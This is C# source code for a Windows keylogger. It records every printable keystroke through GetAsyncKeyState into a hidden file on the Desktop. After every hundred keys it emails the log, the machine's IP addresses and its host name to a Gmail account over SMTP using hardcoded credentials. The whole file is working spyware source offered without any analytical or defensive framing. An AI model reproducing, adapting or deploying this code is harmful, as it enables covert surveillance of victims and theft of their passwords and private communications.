using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    class OldMain
    {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(int keyAsciiNumber);

        static long numberOfKeyStrokes = 0;

        static void MainOld(string[] args)
        {
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if (!Directory.Exists(folderName))
            {
                Directory.CreateDirectory(folderName);
            }

            string fileName = folderName + @"\keylog.txt";

            if (!File.Exists(fileName))
            {
                using (StreamWriter sw = File.CreateText(fileName)) { }
            }

            File.SetAttributes(fileName, File.GetAttributes(fileName) | FileAttributes.Hidden);

            while (true)
            {
                Thread.Sleep(5);

                for (int keyNumber = 32; keyNumber < 127; keyNumber++)
                {
                    int keyState = GetAsyncKeyState(keyNumber);

                    if (keyState == short.MinValue + 1)
                    {
                        Console.Write((char)keyNumber + ", ");

                        using (StreamWriter sw = File.AppendText(fileName))
                        {
                            sw.Write((char)keyNumber);
                        }

                        numberOfKeyStrokes++;

                        if (numberOfKeyStrokes % 100 == 0)
                        {
                            SendMessage();
                        }
                    }
                }
            }
        }

        static void SendMessage()
        {
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string fileName = folderName + @"\keylog.txt";

            string logContent = File.ReadAllText(fileName);

            DateTime now = DateTime.Now;
            string subject = "from Keylogger + ";

            string emailBody = string.Empty;

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\nHost: " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += "\n" + logContent;

            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587);

            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("deckuser1@gmail.com");
            mailMessage.To.Add("deckuser1@gmail.com");

            mailMessage.Subject = subject;

            smtpClient.UseDefaultCredentials = false;
            smtpClient.EnableSsl = true;
            smtpClient.Credentials = new NetworkCredential("deckuser1@gmail.com", "MyPassword"); // not real password

            mailMessage.Body = emailBody;

            smtpClient.Send(mailMessage);
        }
    }
}
